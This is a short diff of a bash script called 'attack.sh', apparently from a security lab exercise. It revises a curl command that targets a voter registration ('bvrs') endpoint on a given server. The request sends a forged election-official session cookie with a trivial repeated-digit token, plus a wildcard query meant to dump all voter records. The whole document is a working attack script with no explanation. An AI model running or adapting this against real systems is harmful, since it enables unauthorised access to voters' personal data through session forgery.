@@ -1,5 +1,14 @@
 #!/bin/bash
 
-SERVER_LOC = $1
+if [ -z "$1" ]
+  then
+    echo "usage: ./attack.sh <server>"
+    exit
+fi
 
-curl -b poison_cookie.txt -I http://$1/bvrs/official_query_voters?lastname=%%
+SERVER_LOC=$1
+echo "connecitng to: $SERVER_LOC"
+
+curl -v -L \
+-b "electionofficialsession-id=1;electionofficialsession-token=111111111111111111111111111111111111111111111111111111111111111111" \
+"http://$SERVER_LOC/bvrs/official_query_voters.json?field-name=lastname&field-contains=%25%25"
